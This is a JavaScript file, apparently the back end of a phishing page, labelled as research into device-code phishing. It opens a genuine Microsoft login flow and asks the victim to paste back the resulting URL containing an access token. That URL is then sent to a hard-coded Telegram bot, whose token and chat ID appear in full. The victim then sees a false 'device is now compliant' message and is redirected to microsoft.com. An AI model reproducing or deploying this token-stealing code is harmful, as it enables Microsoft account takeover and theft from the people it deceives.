/**
 * PATH A: NATIVE BROKER BRIDGE
 * Research Lab: DeviceCodePhishing Evolution
 */

const TG_CONFIG = {
    botToken: "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
    chatId: "1318100118"
};

// 1. Trigger the High-Trust Native Redirect
function startBridge() {
    const BROKER_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e";
    const NATIVE_REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${BROKER_ID}` +
        `&response_type=token+id_token` +
        `&scope=openid+profile+offline_access` +
        `&response_mode=fragment` +
        `&prompt=login` + 
        `&redirect_uri=${encodeURIComponent(NATIVE_REDIRECT)}`;

    // Show the "Sync" UI so it's ready when they look back at this tab
    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    // Open login in a new window to make it easier for user to copy the URL
    window.open(authUrl, "_blank", "width=500,height=600");
}

// 2. Send the manually pasted URL to Telegram
async function exfiltrateToTelegram() {
    const rawData = document.getElementById('raw-url').value;

    if (!rawData || !rawData.includes("access_token")) {
        alert("Please paste the valid sync URL from the login window.");
        return;
    }

    const message = `
🚨 **NATIVE SESSION CAPTURED** 🚨
--------------------------------
**Raw Native URL:** ${rawData}
--------------------------------
*Status: Verification Complete*
    `;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TG_CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CONFIG.chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (response.ok) {
            alert("Verification successful. Your device is now compliant.");
            window.location.href = "https://www.microsoft.com";
        } else {
            throw new Error("Telegram API error");
        }
    } catch (err) {
        console.error("Sync Error:", err);
        alert("Sync failed. Please try again.");
    }
}
